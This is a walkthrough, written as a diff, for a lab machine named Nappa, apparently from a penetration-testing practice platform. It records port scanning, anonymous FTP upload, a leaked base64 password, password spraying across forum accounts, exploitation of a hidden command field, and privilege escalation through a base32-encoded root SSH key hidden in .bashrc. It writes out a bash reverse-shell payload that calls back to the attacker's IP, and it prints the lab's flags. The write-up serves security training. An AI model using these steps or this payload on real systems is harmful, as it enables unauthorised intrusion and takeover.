@@ -1,0 +1,113 @@
+																			                        Nappa Walkthrough
+																			
+
+																										
+Attacker's Machine: 192.168.45.5
+Victim's Machine: 192.168.204.114
+export IP=192.168.204.114
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+21/tcp    open  ftp
+3306/tcp  open  mysql
+8080/tcp  open  http-proxy
+28080/tcp open  thor-engine
+60022/tcp open  unknown
+
+nmap -Pn -n -sC -sV -p21,3306,8080,28080,60022 $IP --open --stats-every=5s -oN results.txt
+
+21/tcp    open  ftp        vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x   14 14       11           4096 Nov 06  2020 forum
+3306/tcp  open  mysql?
+|_    Host '192.168.45.5' is not allowed to connect to this MariaDB server
+8080/tcp  open  http-proxy
+|_http-title: ForumOnRails
+28080/tcp open  http       Apache httpd 2.4.46 ((Unix))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: html5-goku-en-javascript
+60022/tcp open  ssh        OpenSSH 8.4 (protocol 2.0)
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+ 
+Port 21 
+ftp anoynmous@$IP
+cd forum
+put test.txt                                                             # We are able to upload files on the FTP server.
+
+Port 8080
+http://192.168.238.114:8080/login                           # Login page
+
+# Register a new account to get access to the contents of the web application
+new account:
+test@gmail.com
+password
+
+
+# Stack trace found, catche a request in burp and malform the request, for example alter the header Accept to ../../ and you get a stacktrace disclosing the local user kathleen
+   navigating thorugh the application, when you click register, view the source code and we discover a comment containing a password in base64 format: 
+<input type="password" value="it0jNc6L/r090Q==">
+
+# Once you are logged in with your test account, go through the different posts available. Notice the admin's email address available at http://192.168.238.114:8080/questions/features-roadmap
+
+Any further requests, please reach at: admin.forum@easysetting.com 
+
+# Now that, we have the admin's emails, let's try to register an account with the same email address and containing the password we've discovered. Denied!
+# Ok, let's try to use the accounts that we've discovered from all the posts that were made and use the password that we've gathered to log in.
+
+Possible username/accounts: 
+westley.dakari 
+willam.iran 
+logun.vergil
+admin.forum
+romaan.juanluis
+
+westley.dakari@easysetting.com                         it0jNc6L/r090Q==                      [Denied]
+willam.iran@easysetting.com                              it0jNc6L/r090Q==                      [Denied]
+logun.vergil@easysetting.com                             it0jNc6L/r090Q==                      [Denied]
+admin.forum@easysetting.com                           it0jNc6L/r090Q==                      [Allowed]
+romaan.juanluis@easysetting.com                      it0jNc6L/r090Q==                      [Denied]
+
+# Once logged in, notice that in the account setting dropdown menu, a new options is available, Server Status. 
+   Inspect the page and notice that there is a comment left out:
+   
+   <!-- 
+  <input type="text" name="cmd" readonly="">
+  <input type="submit" >
+  -->
+  
+# Remove the comment tags and the readonly tag. Notice that a new search field is available on the page. Use the cmd parameter to obtain a reverse shell.
+
+
+
+nc -lvnp 4444
+
+cmd=/bin/bash -i >& /dev/tcp/192.168.45.5/4444 0>&1
+
+Got shell!
+
+cd /home/kathleen
+cat local.txt                                          # Flag: 25246faa9c8295ffeabc240e8f0f5df1                                   
+
+Privilege escalation
+
+cat .bashrc
+# ~/.bashrc
+#
+# If not running interactively, don't do anything
+[[ $- != *i* ]] && return
+alias ls='ls --color=auto'
+PS1='[\u@\h \W]\$ '
+
+# alias FUWS2LJNIJCUOSKOEBHVARKOKNJUQICQK .....
+
+# Seems to be base32 encoding. After decoding, we see that the string contains the private key. You can decode the key further in base64 and see that it belong to the root user.
+   Grab the key and use SSH to log in as root
+   
+   root@nappa
+   
+chmod 600 id_rsa
+ssh -i id_rsa  root@$IP -p 60022
+cat /root/proof.txt                                                     # Flag: 494a2cd302a2e09e403ed8f02eeb9738
